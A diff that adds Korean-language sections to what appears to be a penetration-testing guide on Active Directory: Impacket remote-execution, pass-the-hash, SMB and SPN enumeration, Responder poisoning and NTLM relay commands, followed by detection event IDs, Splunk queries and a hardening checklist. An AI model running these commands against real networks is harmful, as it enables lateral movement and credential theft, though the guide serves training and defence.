@@ -425,3 +425,165 @@ curl -X POST http://localhost:7474/db/data/cypher \
     -H "Content-Type: application/json" \
     -d '{"query": "MATCH (u:User {name:\"COMPROMISED@DOMAIN\"}) SET u.owned=true"}'
 ```
+
+---
+
+## 9. Linux에서 AD 공격 (Impacket 활용)
+
+### Impacket 설치 및 기본 설정
+```bash
+# Impacket 설치
+pip3 install impacket
+
+# 또는 Kali에서
+apt-get install python3-impacket impacket-scripts
+
+# Kerberos 설정 (필요 시)
+# /etc/krb5.conf
+[libdefaults]
+    default_realm = COMPANY.LOCAL
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+
+[realms]
+    COMPANY.LOCAL = {
+        kdc = dc01.company.local
+        admin_server = dc01.company.local
+    }
+
+[domain_realm]
+    .company.local = COMPANY.LOCAL
+    company.local = COMPANY.LOCAL
+```
+
+### 원격 실행 도구 (Impacket)
+```bash
+# psexec.py — SMB 기반 원격 명령 실행
+python3 psexec.py company.local/Administrator:Password123@TARGET_IP
+
+# wmiexec.py — WMI 기반 (파일 드롭 없음)
+python3 wmiexec.py company.local/Administrator:Password123@TARGET_IP
+
+# smbexec.py — SMB 서비스 기반
+python3 smbexec.py company.local/Administrator:Password123@TARGET_IP
+
+# atexec.py — Task Scheduler 기반
+python3 atexec.py company.local/Administrator:Password123@TARGET_IP whoami
+
+# dcomexec.py — DCOM 기반
+python3 dcomexec.py company.local/Administrator:Password123@TARGET_IP whoami
+
+# 해시로 실행 (Pass-the-Hash)
+python3 wmiexec.py -hashes :NTLM_HASH_HERE company.local/Administrator@TARGET_IP
+```
+
+### SMB 관련 도구
+```bash
+# smbclient.py — SMB 파일 접근
+python3 smbclient.py company.local/user:Password123@TARGET_IP
+
+# 공유 폴더 나열
+python3 smbclient.py -L TARGET_IP -U 'company.local/user%Password123'
+
+# 파일 다운로드
+python3 smbclient.py //TARGET_IP/C$ -U 'company.local/Administrator%Password123' -c 'get Users\Administrator\Desktop\flag.txt'
+
+# GetSPN.py — SPN 열거
+python3 GetUserSPNs.py company.local/user:Password123 -dc-ip DC_IP
+```
+
+### NTLM 릴레이 공격
+```bash
+# 조건: SMB 서명 비활성화 (대부분 워크스테이션)
+# SMB 서명 확인
+nmap --script smb2-security-mode -p 445 TARGET_SUBNET/24
+
+# 릴레이 가능 호스트 파악
+python3 RunFinger.py -i TARGET_SUBNET/24
+
+# Responder — NBNS/LLMNR 포이즈닝
+responder -I eth0 -rdwv
+
+# ntlmrelayx — 릴레이 공격
+python3 ntlmrelayx.py -tf targets.txt -smb2support
+
+# 인터랙티브 세션
+python3 ntlmrelayx.py -tf targets.txt -smb2support -i
+
+# SOCKS 프록시로 내부망 접근
+python3 ntlmrelayx.py -tf targets.txt -smb2support -socks
+# → socks5 127.0.0.1 1080 으로 내부 서비스 접근
+```
+
+---
+
+## 10. AD 방어 및 탐지
+
+### 주요 탐지 이벤트 ID
+```
+이벤트 ID    설명
+──────────────────────────────────────────────────────
+4624         성공적인 로그인
+4625         실패한 로그인
+4648         명시적 자격증명으로 로그인 (PtH 탐지)
+4663         객체 접근
+4672         특수 권한 로그인 (관리자)
+4688         새 프로세스 생성 (커맨드라인 포함)
+4697         서비스 설치
+4698         예약 작업 생성
+4719         감사 정책 변경
+4720         사용자 계정 생성
+4728         글로벌 그룹에 멤버 추가
+4732         로컬 그룹에 멤버 추가
+4756         유니버설 그룹에 멤버 추가
+4768         Kerberos TGT 요청 (AS-REQ)
+4769         Kerberos 서비스 티켓 요청 (TGS-REQ) → Kerberoasting
+4771         Kerberos 사전 인증 실패 → AS-REP Roasting
+4776         NTLM 인증 시도
+4946         방화벽 규칙 추가
+7045         새 서비스 설치 → PsExec 탐지
+```
+
+### 탐지 쿼리 예시 (Splunk)
+```
+# Kerberoasting 탐지 (대량 TGS 요청)
+index=windows EventCode=4769 Ticket_Encryption_Type=0x17
+| stats count by Account_Name, Client_Address
+| where count > 10
+
+# Pass-the-Hash 탐지 (이벤트 ID 4648)
+index=windows EventCode=4648
+| stats count by Subject_Account_Name, Target_Server_Name
+| where count > 5
+
+# DC Sync 탐지
+index=windows EventCode=4662
+| where Access_Mask="0x100" AND Properties IN ("*1131f6ad*","*1131f6aa*")
+| table _time, Account_Name, Object_DN
+```
+
+### AD 강화 체크리스트
+```
+계정 관리:
+  □ 관리자 계정 Tier 분리 (Tier 0/1/2)
+  □ krbtgt 비밀번호 정기 교체 (2회 연속)
+  □ 서비스 계정 관리형 서비스 계정(gMSA) 사용
+  □ 비활성 계정 비활성화 (90일 기준)
+  □ AdminSDHolder 개체 권한 정기 감사
+
+Kerberos 설정:
+  □ AES256 암호화 강제 (RC4 비활성화)
+  □ 사전 인증 요구 활성화 (AS-REP Roasting 방어)
+  □ SPN 불필요한 것 제거 (Kerberoasting 방어)
+
+네트워크:
+  □ SMB 서명 강제 활성화 (NTLM 릴레이 방어)
+  □ LLMNR/NetBIOS 비활성화 (Responder 방어)
+  □ Print Spooler 불필요 서버에서 비활성화
+
+모니터링:
+  □ SIEM에 위 이벤트 ID 알림 설정
+  □ 비정상 Kerberos 티켓 요청 탐지
+  □ DC에 대한 직접 LDAP 쿼리 모니터링
+  □ Mimikatz/LSASS 접근 탐지 (EDR)
+```
